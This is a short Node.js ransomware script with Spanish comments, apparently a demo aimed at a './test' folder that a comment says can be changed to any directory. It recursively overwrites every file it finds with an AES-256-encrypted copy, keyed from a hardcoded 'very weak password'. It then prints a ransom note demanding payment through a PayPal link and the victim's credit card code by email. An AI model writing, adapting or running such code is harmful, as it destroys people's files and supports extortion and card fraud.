fs = require('fs'), crypto = require('crypto');
crypto = require('crypto'), recursive = require("recursive-readdir");

// Evitar el cierre automático
process.stdin.resume();

// Cifrar
encrypt = (text, secret) => {
      const cipher = crypto.createCipher('aes256', secret)
      let crypted = cipher.update(text, 'utf8', 'hex')
      crypted += cipher.final('hex')
      return crypted
}

// Generar una contraseña
const password = JSON.stringify(crypto.createHash('sha256').update('very weak password').digest('hex'));

// Leer archivos
// Puede cambiar './test' a cualquier otro directorio
recursive("./test", ['index.js', 'index.exe', 'decrypt.js', 'decrypt.exe'] , (err, files) => {
  for(let i of files){
    fs.writeFileSync(i, encrypt(fs.readFileSync(i, 'utf8'), password));
}});
console.log(`
¡UPS! Parece que todos tus archivos han sido encriptados :(

  Podemos ayudarte dándote una clave secreta. Simplemente envíe algo de dinero a "link paypal" y escriba un correo electrónico a ejemplo@ejemplo.com con el código de su tarjeta de crédito.`
  );
